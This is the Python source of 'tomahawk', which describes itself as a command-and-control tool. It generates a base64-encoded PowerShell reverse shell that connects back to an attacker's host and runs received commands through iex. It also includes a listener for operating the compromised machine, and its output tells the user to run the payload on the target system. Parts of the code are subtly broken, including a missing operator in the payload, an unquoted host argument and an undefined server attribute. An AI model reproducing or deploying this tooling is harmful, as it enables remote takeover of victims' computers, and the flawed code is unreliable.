#!/usr/bin/python3
import socket
import sys
import re
import argparse
import base64
import time
import threading
import pyfiglet
import os

# --rhost {targetip}
# --lport {lport}
# --lhost {lhost}


class messages:
    def __init__(self):
        self.banner = None
        self.help = None
    def banner():
        # banner = pyfiglet.figlet_format(font="slant", text= "tomahawk")
        # print(banner,"\t\t\t\t\t\tby frankfx9")
        banner = '''   __                        __                   __
  / /_____  ____ ___  ____ _/ /_  ____ __      __/ /__
 / __/ __ \/ __ `__ \/ __ `/ __ \/ __ `/ | /| / / //_/
/ /_/ /_/ / / / / / / /_/ / / / / /_/ /| |/ |/ / ,<
\__/\____/_/ /_/ /_/\__,_/_/ /_/\__,_/ |__/|__/_/|_|

                                                by frankfx9'''

        print(banner)
    def help():
        print("Help Menu For tomahawk")
        print("Command-Line C2 Framework designed by frankfx9")
        print("Github: https://github.com/frankfx9/hacking-tools")





class Payloads:
    def __init__(self, rhost, lhost, lport):
        self.rhost = rhost
        self.lhost = lhost
        self.lport = lport
    
    def createPayload(self):
        payload = f"""$cs = New-Object System.Net.Sockets.TCPClient({self.lhost}, {self.lport});
$st = $cs.GetStream();
[byte[]]$b = 0..65535|%{{0}};
while(($i = $st.Read($b, 0, $b.Length)) -ne 0){{
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb2  = $sb '> ';
    $sbd = ([text.encoding]::ASCII).GetBytes($sb2);
    $st.Write($sbd,0,$sbd.Length);
    $st.Flush()
}};
# $cs.Close()""".encode("utf-16le")
       
        base64_payload = base64.b64encode(payload)
        return base64_payload



class listener:
    def __init__(self, lhost, lport):
        self.lport = lport
        self.lhost = lhost       
        self.client = None
        self.addr = None

    def spinner(self):
        i = 0
        
        while not self.client:
            try:
                spinner = '/' if i % 2 == 0 else '\\'
                print(f"\r[*] Waiting for connection..{spinner}", end='', flush=True)
                time.sleep(0.2)
                i += 1
            except KeyboardInterrupt:
                break

    def listen(self):
        print(f"[*] Setting up listener on {self.lhost}:{self.lport}")
        socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socks.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            socks.bind((self.lhost, self.lport))
            socks.listen(1)
            print(f"[+] Listener up on {self.lhost}:{self.lport}")
            spinner_thread = threading.Thread(target=self.spinner)
            spinner_thread.start()
            self.client, self.addr = socks.accept()
            print("\r" + " " * 40 + "\r", end='', flush=True)
            print(f"[+] Connection from {self.addr[0]}:{self.addr[1]}")
            spinner_thread.join()
            self.handle_client()
        except Exception as e:
            print(f"[-] Error: {e}")
        finally:
            if 'socks' in locals():
                socks.close()
    def handle_client(self):
        try:
            while True:
                # Receive prompt from the client
                prompt = self.client.recv(1024).decode()
                if not prompt:
                    print("Client disconnected.")
                    break

                print(prompt, end="")  # Print the client's prompt
                command = input().strip()

                if command.lower() in ("exit", "quit"):
                    self.client.send(command.encode("utf-8"))
                    print("Exiting...")
                    break

                # Send command to the client
                self.client.send(command.encode("utf-8"))
                
                # Receive response
                response = self.client.recv(4096).decode()
                print(response, end="")
        except Exception as e:
            print(f"Error: {e}")
        finally:
            self.client.close()
            self.server.close()
            print("Listener closed.")

    def command(input):
        while input:
            if (input.lower().strip() == "exit") or (input.lower().strip() == "quit"):
                break
            if input.lower().strip() == "help":
                messages.banner()
                messages.help()
                break




if __name__ == "__main__":   
    messages.banner()
    print("\n")
    try:
        parser = argparse.ArgumentParser(description="A command and control server for powershell payloads.")
        parser.add_argument('mode', choices=['server', 'payload'], help="Mode: 'server' to start listener, 'payload' to generate payload.")
        parser.add_argument('payload',nargs="?", help="Create payload")
        parser.add_argument('server',nargs="?", help="Start up listening server")
        parser.add_argument('--rhost', help="Victim Ip", required=True)
        parser.add_argument('--lport', help="Listening port", default=9999)
        parser.add_argument('--lhost', help="Listening IP(for callback)", required=True)
        args = parser.parse_args()


        if args.mode == "server":
            pattern = r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
            if not re.match(pattern, args.lhost):
                print("[-] Invalid IP address for lhost. See help for more details!")
                sys.exit(1)
            else:
                lhost = args.lhost
                lport = int(args.lport)
                

                shell = listener(lhost=lhost, lport=lport)
                shell.listen()
                while True:
                    menu = input("tomahawk:> ")
                    if menu.lower().strip() == "start": 
                        shell = listener(lhost="0.0.0.0", lport=lport)
                        shell.listen()
                    else:
                        listener.command(menu)  

        elif args.mode == "payload":
            pattern = r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
            if not (re.match(pattern, args.rhost)) and (re.match(pattern, args.lhost)):
                print("[-] Invalid IP address for rhost or lhost. See help for more details!")
                sys.exit(1)
            else:
                lport = int(args.lport)
                lhost = args.lhost
                rhost = args.rhost
            for i in range(5):
                spinner = '/' if i % 2 == 0 else '\\'
                print(f"\r[*] Generating payload..{spinner}", end="", flush=True)
                time.sleep(0.2)
            payload = Payloads(rhost=rhost, lhost=lhost, lport=lport)
            payload_value = payload.createPayload()
            if payload_value:
                print(f"\n[+] Generated Payload Value... run this on the target system\n[+] Payload Value: powershell -enc {payload_value.decode()}")
                while True:
                    menu = input("tomahawk:> ")
                    if menu.lower().strip() == "start":
                        shell = listener(lhost="0.0.0.0", lport=lport)
                        shell.listen()
                    else:
                        listener.command(menu)
            else:
                print(f"[-] Error generating payload!")
                sys.exit(1)

        elif (args.mode != "server") or (args.mode != "payload"):
            print("Error: Please select mode \"server\" or \"payload\"!")
            sys.exit(1)
    except KeyboardInterrupt:
        print("[-] Exiting")